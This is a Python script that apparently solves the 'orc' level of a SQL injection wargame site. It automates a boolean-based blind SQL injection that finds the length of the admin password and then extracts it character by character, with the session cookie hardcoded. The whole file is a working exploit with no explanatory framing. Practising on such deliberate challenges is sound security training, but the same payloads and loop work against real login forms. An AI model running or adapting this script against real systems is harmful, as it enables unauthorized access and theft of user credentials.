from hashlib import new
from requests import get

import string



url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
cookie  = dict(PHPSESSID="lpaiqju1pvd389508vh94qhl4s")
letters = string.digits + string.ascii_letters
password = ""
length = 1


# get password length
while True:
    param = "?pw=' or length(pw)="+str(length)+" and id='admin'-- -"

    new_url = url+param
    req = get(new_url, cookies=cookie)
    if(req.text.find("Hello admin") > 0):
        print("Found password lenght= " + str(length))
        break
    length +=1


# get password
for i in range(1, length+1):
    for x in letters:
        param = "?pw=' or id='admin' and ASCII(SUBSTR(pw,"+str(i)+",1))="+str(ord(x))+"-- -"
        new_url = url+param
        req = get(new_url, cookies=cookie)
        if(req.text.find("Hello admin") > 0):
            print("Found password char " + str(i) + " = " + x)
            password += x
            break



print("password: " + password)





